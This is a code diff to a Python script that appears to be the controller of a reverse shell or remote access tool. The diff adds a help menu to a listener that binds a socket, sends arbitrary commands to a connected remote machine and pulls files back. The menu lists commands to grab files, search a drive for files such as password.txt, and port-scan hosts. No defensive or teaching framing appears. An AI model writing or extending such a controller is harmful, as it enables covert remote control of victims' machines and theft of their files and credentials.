@@ -17,7 +17,12 @@ def transfer(conn,command):
             print("[-] Unable to find out the file")
             break
         f.write(bits)
-    
+def help():
+    print("\nterminate ----> to close the socket\n")
+    print("grab -----> to get a file Eg: grab file.txt\n")
+    print("cd ----> to change directory\n")
+    print("search ----> to search for a file with a specified path Eg: search C:\ password.txt\n")
+    print("scan -----> to scan a host Eg: scan 192.168.0.143:21,22,24,80 etc.\n")
 def connect(ip,port):
     s=socket.socket()
     s.bind((str(ip),int(port)))
@@ -33,6 +38,8 @@ def connect(ip,port):
             break
         elif 'grab' in command:
             transfer(conn,command)
+        elif 'help' in command:
+            help()
         else:
             conn.send(command.encode())
             print(conn.recv(1024).decode())
